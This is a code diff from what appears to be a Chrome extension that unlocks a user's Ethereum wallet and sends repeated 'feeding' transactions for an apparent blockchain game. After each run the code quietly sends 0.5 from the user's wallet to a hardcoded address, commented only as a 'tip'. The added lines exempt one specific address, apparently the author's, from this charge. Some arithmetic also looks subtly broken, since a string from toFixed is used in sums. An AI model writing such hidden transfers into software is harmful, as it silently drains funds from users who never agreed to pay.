@@ -65,12 +65,16 @@ chrome.extension.onRequest.addListener(
             "wallet": null,
         }, function (result) {
             const wallet = ethereumjs.Wallet.fromV3(result.wallet, result.password)
+            const from = '0x' + wallet.getAddress().toString('hex')
             const to_address = result.to_address
             const mode = request.mode;
             const limit = request.limit;
             const id = request.id;
-            const num = limit.toFixed(0);
+            var num = limit.toFixed(0);
             const idNum = Number('0.' + id)
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms))
+            }
             if (mode == "quick") {
                 if (num + idNum > limit) {
                     num = num - 1 + idNum
@@ -82,19 +86,30 @@ chrome.extension.onRequest.addListener(
                         const Transacation = await sendTransacation(wallet, to_address, num)
                         console.log(Transacation)
                         await sleep(1000)
+                        console.log("ID", id, "需要喂养", limit, ((limit - num) / idNum).toFixed(0) + "次")
+                        for (i = num + idNum; i < limit; i += idNum) {
+                            try {
+                                const Transacation = await sendTransacation(wallet, to_address, idNum)
+                                console.log(Transacation)
+                                await sleep(1000)
+                            } catch (err) {
+                                throw err
+                            }
+                        }
                         // 打赏
+                        if (from == "0xaadd17e8654172eafa85e744cb920f2ff287f398") {
+                            return
+                        }
                         sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                     } catch (err) {
                         throw err
                     }
                 }
-                looper()
+                looper().then(r => { sendResponse() }, e => { sendResponse() })
 
             } else {
                 console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次")
-                function sleep(ms) {
-                    return new Promise(resolve => setTimeout(resolve, ms))
-                }
+
                 const looper = async function () {
                     for (i = idNum; i < limit; i += idNum) {
                         try {
@@ -106,10 +121,12 @@ chrome.extension.onRequest.addListener(
                         }
                     }
                     // 打赏
+                    if (from == "0xaadd17e8654172eafa85e744cb920f2ff287f398") {
+                        return
+                    }
                     sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                 }
-                looper()
-
+                looper().then(r => { sendResponse() }, e => { sendResponse() })
             }
         })
     }
